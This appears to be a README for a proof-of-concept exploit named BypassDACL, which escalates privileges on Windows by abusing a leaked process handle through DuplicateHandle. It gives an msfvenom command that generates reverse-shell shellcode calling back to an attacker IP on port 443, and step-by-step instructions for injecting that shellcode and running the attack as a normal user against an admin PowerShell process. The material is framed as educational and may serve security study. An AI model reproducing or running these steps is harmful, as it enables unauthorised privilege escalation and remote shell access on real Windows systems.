# BypassDACL
PoC for Bypass DACL in Windows with DuplicateHandle.
You can read more about this code: https://glory-part-39d.notion.site/Security-of-Handles-in-Windows-caaa2531a0914ef0b7779ea366f69bcb
These codes allow you to create a security hole in your program. You can also use this vulnerability and cause privilege escalation.
**Note that this is a POC and is for educational purposes only**
## Run this code
Generate shellcode for AttackerPE.exe\n
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.148 LPORT=443 -f c -b \x00\x0a\x0d
copy shellcode to AttackerSource.cpp and compile it.

run powershell.exe with Admin privilege
run notepad.exe with normal-user
run vendor.exe with Admin privilege
```
Vendor.exe
Enter the Process name that you want get Handle (like powershell.exe): powershell.exe
Enter the target Process name (like notepad.exe): notepad.exe
[+] SeDebugPrivilege enabled successfully.
[+] PID of powershell.exe 8420
[+] Handle of powershell.exe is OK
[*] Run Process Explorer and find handles of notepad.exe then find a handle named powershell.exe
and write address of handle in AttackerPE code...
[*] Sleep(INFINITE) After running AttackerPE.exe for exit this code press Ctrl+C
```


open **procexp64.exe** and copy address of handle (powershell.exe) from **notepad.exe**
Past address to A
run AttackerPE.exe with normal-user
